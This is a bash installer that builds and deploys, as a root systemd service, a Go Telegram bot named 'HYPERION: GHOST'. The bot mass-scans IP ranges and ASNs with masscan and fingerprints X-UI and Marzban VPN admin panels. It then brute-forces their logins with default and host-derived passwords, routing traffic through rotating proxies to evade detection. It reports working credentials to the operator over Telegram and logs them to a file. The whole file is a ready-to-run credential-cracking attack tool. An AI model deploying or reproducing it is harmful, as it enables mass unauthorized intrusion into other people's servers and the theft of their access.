#!/bin/bash
set -euo pipefail

# ==========================================
# 🌌 HYPERION: GHOST (v44.2 Stable)
# ==========================================
# CHANGELOG:
# - Update Timer: 15s
# - Added Sysctl Network Tuning
# - Added Worker Panic Recovery
# - Optimized Thread Count (800)
# ==========================================

DIR="/opt/xui_scanner_eternal"
SERVICE="xui-bot-eternal"
GO_VER="1.22.4"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}
█░█ █░█ ░░█ ░░█ ░▀░ █▀▀ █░█ █▀█ █▀▀ ▀█▀
▀▄▀ ▀▀█ ▀▀█ ▀▀█ ▀▀▀ █▄█ █▀█ █▄█ ▄██ ░█░ v44.2
GHOST EDITION (Stable + Tuned)
${NC}"

# --- 1. CLEANUP & PREP ---
systemctl stop "$SERVICE" 2>/dev/null || true
pkill -9 xui-bot 2>/dev/null || true
rm -rf "$DIR"
mkdir -p "$DIR"
cd "$DIR"

# --- 1.1 SYSTEM TUNING (NEW) ---
echo -e "${YELLOW}🚀 Tuning System Network Stack...${NC}"
cat > /etc/sysctl.d/99-eternal.conf << EOF
fs.file-max = 1000000
net.core.default_qdisc = fq
net.ipv4.tcp_congestion_control = bbr
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_fin_timeout = 10
net.ipv4.ip_local_port_range = 1024 65535
net.core.somaxconn = 65535
net.ipv4.tcp_max_syn_backlog = 4096
EOF
sysctl --system >/dev/null 2>&1

# --- 2. INSTALL GO ---
if [[ ! -d "/usr/local/go" ]]; then
    echo -e "${YELLOW}⬇️  Installing Go...${NC}"
    wget -q --show-progress "https://go.dev/dl/go${GO_VER}.linux-amd64.tar.gz" -O go.tar.gz
    rm -rf /usr/local/go && tar -C /usr/local -xzf go.tar.gz
    rm go.tar.gz
    echo -e "${GREEN}✅ Go Installed!${NC}"
fi
export PATH=$PATH:/usr/local/go/bin

# --- 3. NETWORK & MASSCAN ---
REAL_IFACE=$(ip route get 1.1.1.1 | grep -oP 'dev \K\S+')
MASSCAN_BIN=$(which masscan || echo "/usr/bin/masscan")
if [[ ! -x "$MASSCAN_BIN" ]]; then
    echo -e "${YELLOW}📦 Installing Masscan...${NC}"
    apt-get update -qq && apt-get install -y masscan libpcap-dev >/dev/null 2>&1
    MASSCAN_BIN=$(which masscan)
fi
MASSCAN_BIN=$(echo "$MASSCAN_BIN" | tr -d '^')

# --- 4. CREDENTIALS ---
if [[ -f "../token.safe" ]]; then cp "../token.safe" .; cp "../admin.safe" .; fi
if [[ ! -s "token.safe" ]]; then
    read -p "Enter Bot Token: " INPUT_TOKEN
    echo "$INPUT_TOKEN" | tr -d '[:space:]' > token.safe
    read -p "Enter Admin ID: " INPUT_ADMIN
    echo "$INPUT_ADMIN" | tr -cd '0-9' > admin.safe
fi
BOT_TOKEN=$(cat token.safe)
ADMIN_ID=$(cat admin.safe)

# --- 5. FORGE GHOST CORE ---
echo -e "${CYAN}🏗️  Forging GHOST Core...${NC}"

cat > main.go << 'GO_SOURCE'
package main

import (
    "bufio"
    "context"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io"
    "log"
    mrand "math/rand"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "regexp"
    "runtime"
    "runtime/debug"
    "strings"
    "sync"
    "sync/atomic"
    "time"

    tele "gopkg.in/telebot.v3"
)

// CONSTANTS
const (
    BotToken    = "CONST_TOKEN_HERE"
    AdminID     = CONST_ADMIN_HERE
    MasscanPath = "CONST_MASSCAN_HERE"
    IfaceName   = "CONST_IFACE_HERE"
    DefaultRate = "10000"
)

var (
    // OPTIMIZED: Reduced to 800 for stability on VPS
    MaxWorkers    = 800 
    GlobalTimeout = 12 * time.Second
    
    // Proxy System
    LiveProxies    []string
    ProxyMutex     sync.RWMutex
    
    // Scanner
    TargetPorts = []string{
    "80", "81", "82", "88", "443", "8443", 
    
    // Cloudflare
    "2052", "2053", "2082", "2083", "2086", "2087", "2095", "2096",
    
    // HTTP/Dev
    "3000", "4000", "5000", "5001", "8000", "8001", "8008", 
    "8080", "8081", "8082", "8088", "8090", "8888", "9000", "9090",
    
    // Proxy/VPN
    "1080", "3128", "8388", "10808", "10809", 
    
    // Admin Panels
    "7800", "8880", "9443", "9999", "10000",
    
    // X-UI / Marzban
    "2024", "2025", 
    "54321", 
    "2052", "2053", 
    "40000", "44300", 
    "50000", "50001", "50002", 
    "60000", "65432", 
    }
    
    UserAgents = []string{
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) Version/17.5 Safari/605.1.15",
    }

    BaseCreds = []Credential{
        {"admin", "admin"}, {"admin", "password"}, {"admin", "123456"},
        {"root", "root"}, {"root", "password"}, {"user", "user"},
        {"admin", "1234"}, {"admin", "12345"}, {"admin", "1111"},
        {"marzban", "marzban"}, {"marzban", "password"}, {"admin", "marzban"},
        {"x-ui", "admin"}, {"admin", "x-ui"}, {"admin", "admin2024"}, 
        {"admin", "admin2025"}, {"admin", "2024"}, {"admin", "2025"},
        {"admin", "admin123"}, {"support", "support"}, {"ubnt", "ubnt"},
    }

    FinalCreds  []Credential
    credsMutex  sync.RWMutex
    isScanning  atomic.Bool
    cancelScan  context.CancelFunc
    asnPattern  = regexp.MustCompile(`(?i)^(?:AS\s*)?(\d+)$`)
    
    stats  = &ScanStats{}
    dbFile = "db_eternal.txt"
    dbLock sync.Mutex
)

type Credential struct{ User, Pass string }
type ScanStats struct {
    MasscanFound, Checked, XuiDetected, Cracked int64
    StartTime time.Time
}
type ScanResult struct {
    URL, IP, Port, Username, Password, Type, Country, Flag, ISP, MetaInfo string
}
type GeoIPResponse struct {
    Country, CountryCode, Isp string
}
type RipeStatResponse struct {
    Data struct {
        Prefixes []struct { Prefix string `json:"prefix"` } `json:"prefixes"`
    } `json:"data"`
}

func main() {
    debug.SetGCPercent(40)
    runtime.GOMAXPROCS(runtime.NumCPU())
    loadCredentials()
    
    pref := tele.Settings{
        Token:  BotToken,
        Poller: &tele.LongPoller{Timeout: 10 * time.Second},
    }
    b, err := tele.NewBot(pref)
    if err != nil { log.Fatal(err) }

    // --- MENU ---
    menu := &tele.ReplyMarkup{}
    btnRestart := menu.Data("🔄 Restart", "svc_restart")
    btnDownload := menu.Data("📥 Get DB", "db_down")
    btnClear := menu.Data("🔥 Clear DB", "db_clear")
    menu.Inline(menu.Row(btnRestart), menu.Row(btnDownload, btnClear))

    b.Handle(&btnRestart, func(c tele.Context) error {
        if c.Sender().ID != AdminID { return nil }
        c.Respond()
        c.Send("♻️ <b>GHOST is restarting...</b>", tele.ModeHTML)
        go func() { time.Sleep(1 * time.Second); os.Exit(0) }()
        return nil
    })
    
    b.Handle(&btnDownload, func(c tele.Context) error {
        if c.Sender().ID != AdminID { return nil }
        dbLock.Lock(); defer dbLock.Unlock()
        if _, err := os.Stat(dbFile); os.IsNotExist(err) { return c.Respond(&tele.CallbackResponse{Text: "Empty DB!"}) }
        return c.Send(&tele.Document{File: tele.FromDisk(dbFile), FileName: fmt.Sprintf("eternal_%d.txt", time.Now().Unix())})
    })

    b.Handle(&btnClear, func(c tele.Context) error {
        if c.Sender().ID != AdminID { return nil }
        dbLock.Lock(); defer dbLock.Unlock()
        os.Truncate(dbFile, 0)
        return c.Respond(&tele.CallbackResponse{Text: "Database Cleared!"})
    })

    b.Handle("/start", func(c tele.Context) error {
        if c.Sender().ID != AdminID { return nil }
        ProxyMutex.RLock()
        pCount := len(LiveProxies)
        ProxyMutex.RUnlock()
        status := "❌ Direct Mode (No Proxies)"
        if pCount > 0 { status = fmt.Sprintf("✅ <b>GHOST MODE:</b> %d live proxies", pCount) }
        
        return c.Send(fmt.Sprintf("👻 <b>HYPERION: GHOST v44.2</b>\n\nIface: %s\nMode: %s\n\n<b>How to use:</b>\n1. Send <code>proxies.txt</code> to enable Ghost Mode.\n2. Send IP/ASN/Range to scan.", IfaceName, status), menu, tele.ModeHTML)
    })

    b.Handle("/stop", cmdStop)
    b.Handle(tele.OnText, handleText)
    b.Handle(tele.OnDocument, handleDocument)

    log.Printf("🚀 v44.2 GHOST Started")
    b.Start()
}

// --- PROXY ENGINE ---

func getClient() *http.Client {
    ProxyMutex.RLock()
    defer ProxyMutex.RUnlock()
    
    transport := &http.Transport{
        TLSClientConfig:     &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS10},
        DisableKeepAlives:   true,
        MaxIdleConns:        100,
        IdleConnTimeout:     5 * time.Second,
        TLSHandshakeTimeout: 5 * time.Second,
    }

    if len(LiveProxies) > 0 {
        proxyStr := LiveProxies[mrand.Intn(len(LiveProxies))]
        if !strings.HasPrefix(proxyStr, "http") && !strings.HasPrefix(proxyStr, "socks") {
            proxyStr = "http://" + proxyStr
        }
        if proxyURL, err := url.Parse(proxyStr); err == nil {
            transport.Proxy = http.ProxyURL(proxyURL)
        }
    }

    return &http.Client{
        Timeout:   GlobalTimeout,
        Transport: transport,
    }
}

func processProxies(b *tele.Bot, chat *tele.Chat, content []byte) {
    lines := strings.FieldsFunc(string(content), func(r rune) bool { return r == '\n' || r == '\r' })
    msg, _ := b.Send(chat, fmt.Sprintf("🕵️ <b>Checking %d proxies...</b>\nThis might take a moment.", len(lines)), tele.ModeHTML)
    
    valid := []string{}
    var mu sync.Mutex
    var wg sync.WaitGroup
    sem := make(chan struct{}, 200)

    for _, p := range lines {
        p = strings.TrimSpace(p)
        if p == "" { continue }
        wg.Add(1)
        go func(proxy string) {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()
            
            checkUrl := proxy
            if !strings.HasPrefix(checkUrl, "http") && !strings.HasPrefix(checkUrl, "socks") {
                checkUrl = "http://" + checkUrl
            }
            
            pURL, err := url.Parse(checkUrl)
            if err != nil { return }
            
            client := &http.Client{
                Timeout: 5 * time.Second,
                Transport: &http.Transport{
                    Proxy: http.ProxyURL(pURL),
                    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                },
            }
            
            if resp, err := client.Get("http://www.google.com/robots.txt"); err == nil {
                resp.Body.Close()
                if resp.StatusCode == 200 {
                    mu.Lock()
                    valid = append(valid, proxy)
                    mu.Unlock()
                }
            }
        }(p)
    }
    wg.Wait()

    ProxyMutex.Lock()
    LiveProxies = valid
    ProxyMutex.Unlock()
    
    b.Edit(msg, fmt.Sprintf("👻 <b>GHOST MODE ACTIVATED</b>\n\nLoaded: %d\nAlive: %d\n\nAll scans will now be routed through these proxies.", len(lines), len(valid)), tele.ModeHTML)
}

// --- SCANNER LOGIC ---

func handleDocument(c tele.Context) error {
    if c.Sender().ID != AdminID { return nil }
    doc := c.Message().Document
    if doc == nil { return nil }
    
    reader, err := c.Bot().File(&doc.File)
    if err != nil { return nil }
    defer reader.Close()
    content, _ := io.ReadAll(reader)
    
    if doc.FileName == "passwords.txt" {
        os.WriteFile("passwords.txt", content, 0644)
        loadCredentials()
        return c.Send(fmt.Sprintf("✅ Wordlist: %d entries", len(FinalCreds)))
    }
    
    if strings.Contains(doc.FileName, "proxies") || strings.Contains(doc.FileName, "proxy") {
        go processProxies(c.Bot(), c.Chat(), content)
        return nil
    }
    
    targets := parseTargets(string(content))
    go runStreamingScan(c.Bot(), c.Chat(), targets)
    return c.Send(fmt.Sprintf("📁 Targets: %d", len(targets)))
}

func handleText(c tele.Context) error {
    if c.Sender().ID != AdminID || strings.HasPrefix(c.Text(), "/") { return nil }
    if isScanning.Load() { return c.Send("⚠️ Eternal is busy.") }
    go runStreamingScan(c.Bot(), c.Chat(), parseTargets(c.Text()))
    return nil
}

func cmdStop(c tele.Context) error {
    if c.Sender().ID != AdminID { return nil }
    if cancelScan != nil {
        cancelScan()
        exec.Command("pkill", "-9", "masscan").Run()
        return c.Send("🛑 Stopped.")
    }
    return c.Send("⚠️ Idle.")
}

func runStreamingScan(b *tele.Bot, chat *tele.Chat, inputs []string) {
    isScanning.Store(true)
    defer isScanning.Store(false)
    ctx, cancel := context.WithCancel(context.Background())
    cancelScan = cancel
    defer cancel()

    atomic.StoreInt64(&stats.MasscanFound, 0)
    atomic.StoreInt64(&stats.Checked, 0)
    atomic.StoreInt64(&stats.XuiDetected, 0)
    atomic.StoreInt64(&stats.Cracked, 0)
    stats.StartTime = time.Now()

    msg, _ := b.Send(chat, "👻 <b>GHOST SCANNING...</b>", tele.ModeHTML)
    
    var scanTargets []string
    for _, t := range inputs {
        if asnPattern.MatchString(t) {
            if p, err := resolveASN(t); err == nil { scanTargets = append(scanTargets, p...) }
        } else { scanTargets = append(scanTargets, t) }
    }

    jobs := make(chan string, 50000)
    results := make(chan *ScanResult, 500)
    var wg sync.WaitGroup

    // Workers
    for i := 0; i < MaxWorkers; i++ {
        wg.Add(1)
        go func() { defer wg.Done(); worker(ctx, jobs, results) }()
    }

    // Masscan Stream
    go func() {
        runMasscanStream(ctx, scanTargets, jobs)
        close(jobs)
    }()
    
    // UI Updater (OPTIMIZED)
    uiDone := make(chan bool)
    go func() {
        // --- CHANGE: 15 SECONDS TIMER ---
        ticker := time.NewTicker(15 * time.Second)
        defer ticker.Stop()
        
        lastMsg := "" // Keep track of last message
        
        for {
            select {
            case <-uiDone: return
            case <-ctx.Done(): return
            case <-ticker.C:
                m := atomic.LoadInt64(&stats.MasscanFound)
                c := atomic.LoadInt64(&stats.Checked)
                x := atomic.LoadInt64(&stats.XuiDetected)
                h := atomic.LoadInt64(&stats.Cracked)
                
                newText := fmt.Sprintf("👻 <b>GHOST STATUS</b>\n\nFound: %d\nChecked: %d\nX-UI: %d\nOwned: %d", m, c, x, h)
                
                // Only edit if text changed to avoid 429 errors
                if newText != lastMsg {
                    _, err := b.Edit(msg, newText, tele.ModeHTML)
                    if err == nil {
                        lastMsg = newText
                    }
                }
            }
        }
    }()

    var crackedList []string
    go func() { wg.Wait(); close(results) }()

    for res := range results {
        atomic.AddInt64(&stats.Cracked, 1)
        saveToDB(res)
        txt := fmt.Sprintf("<b>[%s]</b> %s %s\n%s | <code>%s:%s</code>\nISP: %s\n\n%s", 
            res.Type, res.Flag, res.Country, res.URL, res.Username, res.Password, res.ISP, res.MetaInfo)
        crackedList = append(crackedList, txt)
        b.Send(chat, fmt.Sprintf("💎 <b>HIT</b>\n%s", txt), tele.ModeHTML)
    }

    close(uiDone)
    time.Sleep(500 * time.Millisecond)
    if ctx.Err() == nil {
        b.Edit(msg, fmt.Sprintf("🏁 <b>DONE</b>\nTotal: %d", len(crackedList)), tele.ModeHTML)
        if len(crackedList) > 0 {
            fName := fmt.Sprintf("eternal_%d.txt", time.Now().Unix())
            os.WriteFile(fName, []byte(strings.Join(crackedList, "\n\n")), 0644)
            b.Send(chat, &tele.Document{File: tele.FromDisk(fName)})
            os.Remove(fName)
        }
    }
}

func runMasscanStream(ctx context.Context, targets []string, out chan<- string) {
    tmpIn := fmt.Sprintf("in_%d.tmp", time.Now().UnixNano())
    os.WriteFile(tmpIn, []byte(strings.Join(targets, "\n")), 0644)
    defer os.Remove(tmpIn)
    
    args := []string{"-iL", tmpIn, "-p", strings.Join(TargetPorts, ","), "--rate", DefaultRate, "--wait", "0", "--open", "-e", IfaceName}
    cmd := exec.CommandContext(ctx, MasscanPath, args...)
    stdout, err := cmd.StdoutPipe()
    if err != nil { return }
    if err := cmd.Start(); err != nil { return }

    scanner := bufio.NewScanner(stdout)
    for scanner.Scan() {
        line := scanner.Text()
        if strings.HasPrefix(line, "Discovered") {
            fields := strings.Fields(line)
            if len(fields) >= 6 {
                portProto := fields[3]
                ip := fields[5]
                if idx := strings.Index(portProto, "/"); idx != -1 {
                    out <- ip + ":" + portProto[:idx]
                    atomic.AddInt64(&stats.MasscanFound, 1)
                }
            }
        }
    }
    cmd.Wait()
}

func worker(ctx context.Context, jobs <-chan string, results chan<- *ScanResult) {
    // --- STABILITY FIX: RECOVER FROM PANICS ---
    defer func() {
        if r := recover(); r != nil {
            // Log error silently and continue worker pool logic if needed, 
            // but here we just exit the goroutine safely to avoid crashing the bot.
            return
        }
    }()

    for target := range jobs {
        if ctx.Err() != nil { return }
        
        panelType, validUrl := detectUniversal(ctx, target)
        atomic.AddInt64(&stats.Checked, 1)
        
        if panelType != "" {
            atomic.AddInt64(&stats.XuiDetected, 1)
            if res := trySmartBrute(ctx, validUrl, panelType); res != nil {
                country, flag, isp := getGeoInfo(res.IP)
                res.Country = country; res.Flag = flag; res.ISP = isp
                res.MetaInfo = fetchDeepIntel(ctx, res)
                results <- res
            }
        }
    }
}

// --- SMART BRUTE & LOGIC ---

func detectUniversal(ctx context.Context, target string) (string, string) {
    schemes := []string{"http", "https"}
    if strings.HasSuffix(target, ":443") || strings.HasSuffix(target, ":8443") || strings.HasSuffix(target, ":2053") {
        schemes = []string{"https", "http"}
    }
    paths := []string{"/", "/login", "/dashboard", "/panel", "/xui"}

    client := getClient() 

    for _, s := range schemes {
        for _, p := range paths {
            urlVal := fmt.Sprintf("%s://%s%s", s, target, p)
            reqCtx, cancel := context.WithTimeout(ctx, 6*time.Second)
            req, _ := http.NewRequestWithContext(reqCtx, "GET", urlVal, nil)
            req.Header.Set("User-Agent", UserAgents[mrand.Intn(len(UserAgents))])
            
            resp, err := client.Do(req)
            if err != nil { cancel(); continue }
            
            body, _ := io.ReadAll(io.LimitReader(resp.Body, 40000))
            io.Copy(io.Discard, resp.Body); resp.Body.Close(); cancel()
            
            content := strings.ToLower(string(body))
            if strings.Contains(content, "httputil.post('/login'") || strings.Contains(content, "xray.js") || strings.Contains(content, "3x-ui") { return "X-UI", urlVal }
            if strings.Contains(content, "marzban") || strings.Contains(content, "_nuxt") || strings.Contains(content, "/dashboard/login") { return "Marzban", urlVal }
        }
    }
    return "", ""
}

func trySmartBrute(ctx context.Context, baseURL, panelType string) *ScanResult {
    u, _ := url.Parse(baseURL)
    host := u.Hostname()
    port := u.Port()
    if port == "" { if u.Scheme == "https" { port = "443" } else { port = "80" } }

    credsMutex.RLock()
    localCreds := make([]Credential, len(FinalCreds))
    copy(localCreds, FinalCreds)
    credsMutex.RUnlock()

    // --- SMART CONTEXT GENERATOR ---
    cleanIP := strings.ReplaceAll(host, ".", "")
    parts := strings.Split(host, ".")
    smartPass := []string{port, cleanIP}
    
    domainParts := strings.Split(host, ".")
    for _, part := range domainParts {
        if len(part) > 3 && !strings.Contains(part, ":") {
            smartPass = append(smartPass, part, part+"123", part+"2024", part+"2025", part+"2026")
        }
    }
    
    if len(parts) == 4 { 
        smartPass = append(smartPass, parts[0]+parts[1]+parts[2]+parts[3]) 
        smartPass = append(smartPass, parts[2]+parts[3]+parts[0]+parts[1]) 
    }

    for _, p := range smartPass {
        localCreds = append([]Credential{{"admin", p}, {"root", p}}, localCreds...)
    }

    for _, c := range localCreds {
        if ctx.Err() != nil { return nil }
        var success bool
        if panelType == "X-UI" { 
            success = bruteXUI(ctx, baseURL, c.User, c.Pass) 
        } else if panelType == "Marzban" { 
            success = bruteMarzban(ctx, baseURL, c.User, c.Pass) 
        }
        
        if success {
            return &ScanResult{URL: baseURL, IP: host, Port: port, Username: c.User, Password: c.Pass, Type: panelType}
        }
    }
    return nil
}

func bruteXUI(ctx context.Context, baseURL, user, pass string) bool {
    loginURL := baseURL
    if !strings.HasSuffix(baseURL, "/login") { if strings.HasSuffix(baseURL, "/") { loginURL += "login" } else { loginURL += "/login" } }
    if strings.Contains(loginURL, "/dashboard/login") { loginURL = strings.Replace(loginURL, "/dashboard/login", "/login", 1) }

    payload := fmt.Sprintf(`{"username":"%s","password":"%s"}`, user, pass)
    reqCtx, cancel := context.WithTimeout(ctx, 4*time.Second)
    req, _ := http.NewRequestWithContext(reqCtx, "POST", loginURL, strings.NewReader(payload))
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("User-Agent", UserAgents[mrand.Intn(len(UserAgents))])
    
    resp, err := getClient().Do(req) 
    if err != nil { cancel(); return false }
    body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
    io.Copy(io.Discard, resp.Body); resp.Body.Close(); cancel()
    return strings.Contains(string(body), `"success":true`) || strings.Contains(string(body), `"success": true`)
}

func bruteMarzban(ctx context.Context, baseURL, user, pass string) bool {
    u, _ := url.Parse(baseURL)
    apiURL := fmt.Sprintf("%s://%s/api/admin/token", u.Scheme, u.Host)

    data := url.Values{}
    data.Set("username", user)
    data.Set("password", pass)
    data.Set("grant_type", "password")

    reqCtx, cancel := context.WithTimeout(ctx, 4*time.Second)
    req, _ := http.NewRequestWithContext(reqCtx, "POST", apiURL, strings.NewReader(data.Encode()))
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("User-Agent", UserAgents[mrand.Intn(len(UserAgents))])
    
    resp, err := getClient().Do(req) 
    if err != nil { cancel(); return false }
    body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
    io.Copy(io.Discard, resp.Body); resp.Body.Close(); cancel()
    return strings.Contains(string(body), "access_token")
}

func fetchDeepIntel(ctx context.Context, res *ScanResult) string {
    if res.Type == "X-UI" { return "✅ Panel Accessed." }
    if res.Type == "Marzban" { return "🦅 Marzban Unlocked." }
    return "Unknown"
}

func saveToDB(res *ScanResult) {
    dbLock.Lock(); defer dbLock.Unlock()
    f, err := os.OpenFile(dbFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil { return }
    defer f.Close()
    line := fmt.Sprintf("[%s] %s | %s | %s:%s | %s\n", time.Now().Format("2006-01-02 15:04"), res.Type, res.URL, res.Username, res.Password, res.Country)
    f.WriteString(line)
}

func getGeoInfo(ip string) (string, string, string) {
    client := &http.Client{Timeout: 3 * time.Second}
    resp, err := client.Get("http://ip-api.com/json/" + ip + "?fields=status,country,countryCode,isp")
    if err != nil { return "Unknown", "🏳️", "Unknown" }
    defer resp.Body.Close()
    var geo GeoIPResponse
    if err := json.NewDecoder(resp.Body).Decode(&geo); err != nil { return "Unknown", "🏳️", "Unknown" }
    return geo.Country, getFlag(geo.CountryCode), geo.Isp
}

func getFlag(cc string) string {
    if len(cc) != 2 { return "🏳️" }
    cc = strings.ToUpper(cc)
    return string(rune(cc[0])+127397) + string(rune(cc[1])+127397)
}

func loadCredentials() {
    credsMutex.Lock(); defer credsMutex.Unlock()
    FinalCreds = nil
    seen := make(map[string]bool)
    add := func(c Credential) { k := c.User + ":" + c.Pass; if !seen[k] { seen[k] = true; FinalCreds = append(FinalCreds, c) } }
    for _, c := range BaseCreds { add(c) }
    if file, err := os.Open("passwords.txt"); err == nil {
        defer file.Close(); sc := bufio.NewScanner(file)
        for sc.Scan() {
            line := strings.TrimSpace(sc.Text())
            if line != "" && !strings.HasPrefix(line, "#") {
                parts := strings.SplitN(line, ":", 2)
                if len(parts) == 2 { add(Credential{parts[0], parts[1]}) } else { add(Credential{"admin", line}) }
            }
        }
    }
}

func parseTargets(text string) []string {
    lines := strings.FieldsFunc(text, func(r rune) bool { return r == '\n' || r == '\r' || r == ',' || r == ';' || r == ' ' })
    var targets []string
    for _, l := range lines {
        l = strings.TrimSpace(l)
        if l != "" && !strings.HasPrefix(l, "#") { targets = append(targets, l) }
    }
    return targets
}

func resolveASN(input string) ([]string, error) {
    matches := asnPattern.FindStringSubmatch(input)
    if len(matches) < 2 { return nil, fmt.Errorf("bad asn") }
    c := &http.Client{Timeout: 10 * time.Second}
    resp, err := c.Get(fmt.Sprintf("https://stat.ripe.net/data/announced-prefixes/data.json?resource=AS%s", matches[1]))
    if err == nil {
        defer resp.Body.Close(); var res RipeStatResponse
        if err := json.NewDecoder(resp.Body).Decode(&res); err == nil {
             var prefixes []string
             for _, i := range res.Data.Prefixes { if strings.Contains(i.Prefix, ".") && !strings.Contains(i.Prefix, ":") { prefixes = append(prefixes, i.Prefix) } }
             if len(prefixes) > 0 { return prefixes, nil }
        }
    }
    return nil, fmt.Errorf("no prefixes")
}
GO_SOURCE

# --- COMPILE ---
echo -e "${YELLOW}⚙️  Configuring & Compiling...${NC}"
sed -i "s^CONST_TOKEN_HERE^${BOT_TOKEN}^g" main.go
sed -i "s^CONST_ADMIN_HERE^${ADMIN_ID}^g" main.go
sed -i "s^CONST_MASSCAN_HERE^${MASSCAN_BIN}^g" main.go
sed -i "s^CONST_IFACE_HERE^${REAL_IFACE}^g" main.go

/usr/local/go/bin/go mod init xui-scanner 2>/dev/null || true
/usr/local/go/bin/go get gopkg.in/telebot.v3 >/dev/null
CGO_ENABLED=0 /usr/local/go/bin/go build -ldflags="-s -w" -trimpath -o xui-bot main.go

# --- SERVICE ---
cat > /etc/systemd/system/$SERVICE.service << EOF
[Unit]
Description=X-UI GHOST (v44.2 Stable)
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$DIR
ExecStart=$DIR/xui-bot
Restart=always
RestartSec=1
LimitNOFILE=1048576 
Environment="PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable "$SERVICE" >/dev/null 2>&1
systemctl restart "$SERVICE"

echo -e "${GREEN}👻 HYPERION: GHOST v44.2 IS ALIVE!${NC}"